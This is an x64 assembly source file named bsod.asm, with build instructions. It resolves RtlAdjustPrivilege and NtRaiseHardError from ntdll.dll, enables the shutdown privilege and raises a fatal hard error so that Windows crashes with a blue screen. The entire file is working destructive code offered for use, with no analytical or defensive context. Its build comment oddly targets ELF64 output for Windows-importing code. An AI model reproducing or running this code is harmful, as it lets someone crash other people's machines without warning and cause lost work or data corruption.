;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  Created by 0x03f3 - http://github.com/0x03f3 ;;
;;                                               ;;
;;  nasm -felf64 bsod.asm -o bsod.obj            ;;
;;  gcc bsod.obj -o bsod                         ;;
;;                                               ;;
;;  Mode: 64 bits                                ;;
;;  Syntax: YASM/NASM                            ;;
;;  Instruction set: 80386, x64                  ;;
;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

default rel

global main: function

extern __main                                           ; near
extern __imp_LoadLibraryA                               ; qword
extern __imp_GetProcAddress                             ; qword


SECTION .rdata                                          ; section number 1, const

NTDLL:                                                  ; byte
        db 6EH, 74H, 64H, 6CH, 6CH, 2EH, 64H, 6CH       ; 0000 _ ntdll.dl
        db 6CH, 00H                                     ; 0008 _ l.

RTLA:                                                   ; byte
        db 52H, 74H, 6CH, 41H, 64H, 6AH, 75H, 73H       ; 000A _ RtlAdjus
        db 74H, 50H, 72H, 69H, 76H, 69H, 6CH, 65H       ; 0012 _ tPrivile
        db 67H, 65H, 00H                                ; 001A _ ge.

NTRA:                                                   ; byte
        db 4EH, 74H, 52H, 61H, 69H, 73H, 65H, 48H       ; 001D _ NtRaiseH
        db 61H, 72H, 64H, 45H, 72H, 72H, 6FH, 72H       ; 0025 _ ardError
        db 00H, 00H, 00H                                ; 002D _ ...


SECTION .text                                           ; section number 2, code

main:   ; Function begin
NTRA.text:
        push    rbp                                     ; 0000 _ 55
        mov     rbp, rsp                                ; 0001 _ 48: 89. E5
        sub     rsp, 80                                 ; 0004 _ 48: 83. EC, 50
        call    __main                                  ; 0008 _ E8, 00000000(rel)
        lea     rcx, [rel NTDLL]                        ; 000D _ 48: 8D. 0D, 00000000(rel)
        mov     rax, qword [rel __imp_LoadLibraryA]     ; 0014 _ 48: 8B. 05, 00000000(rel)
        call    rax                                     ; 001B _ FF. D0
        lea     rdx, [rel RTLA]                         ; 001D _ 48: 8D. 15, 00000000(rel)
        mov     rcx, rax                                ; 0024 _ 48: 89. C1
        mov     rax, qword [rel __imp_GetProcAddress]   ; 0027 _ 48: 8B. 05, 00000000(rel)
        call    rax                                     ; 002E _ FF. D0
        mov     qword [rbp-8H], rax                     ; 0030 _ 48: 89. 45, F8
        lea     rdx, [rbp-11H]                          ; 0034 _ 48: 8D. 55, EF
        mov     rax, qword [rbp-8H]                     ; 0038 _ 48: 8B. 45, F8
        mov     r9, rdx                                 ; 003C _ 49: 89. D1
        mov     r8d, 0                                  ; 003F _ 41: B8, 00000000
        mov     edx, 1                                  ; 0045 _ BA, 00000001
        mov     ecx, 19                                 ; 004A _ B9, 00000013
        call    rax                                     ; 004F _ FF. D0
        test    eax, eax                                ; 0051 _ 85. C0
        sete    al                                      ; 0053 _ 0F 94. C0
        test    al, al                                  ; 0056 _ 84. C0
        jz      BSOD                                     ; 0058 _ 74, 54
        lea     rcx, [rel NTDLL]                        ; 005A _ 48: 8D. 0D, 00000000(rel)
        mov     rax, qword [rel __imp_LoadLibraryA]     ; 0061 _ 48: 8B. 05, 00000000(rel)
        call    rax                                     ; 0068 _ FF. D0
        lea     rdx, [rel NTRA]                         ; 006A _ 48: 8D. 15, 00000000(rel)
        mov     rcx, rax                                ; 0071 _ 48: 89. C1
        mov     rax, qword [rel __imp_GetProcAddress]   ; 0074 _ 48: 8B. 05, 00000000(rel)
        call    rax                                     ; 007B _ FF. D0
        mov     qword [rbp-10H], rax                    ; 007D _ 48: 89. 45, F0
        lea     rax, [rbp-18H]                          ; 0081 _ 48: 8D. 45, E8
        mov     qword [rsp+28H], rax                    ; 0085 _ 48: 89. 44 24, 28
        mov     dword [rsp+20H], 6                      ; 008A _ C7. 44 24, 20, 00000006
        mov     rax, qword [rbp-10H]                    ; 0092 _ 48: 8B. 45, F0
        mov     r9d, 0                                  ; 0096 _ 41: B9, 00000000
        mov     r8d, 0                                  ; 009C _ 41: B8, 00000000
        mov     edx, 0                                  ; 00A2 _ BA, 00000000
        mov     ecx, 3221225474                         ; 00A7 _ B9, C0000002
        call    rax                                     ; 00AC _ FF. D0
BSOD:    mov     eax, 0                                  ; 00AE _ B8, 00000000
        leave                                           ; 00B3 _ C9
        ret                                             ; 00B4 _ C3
; main End of function


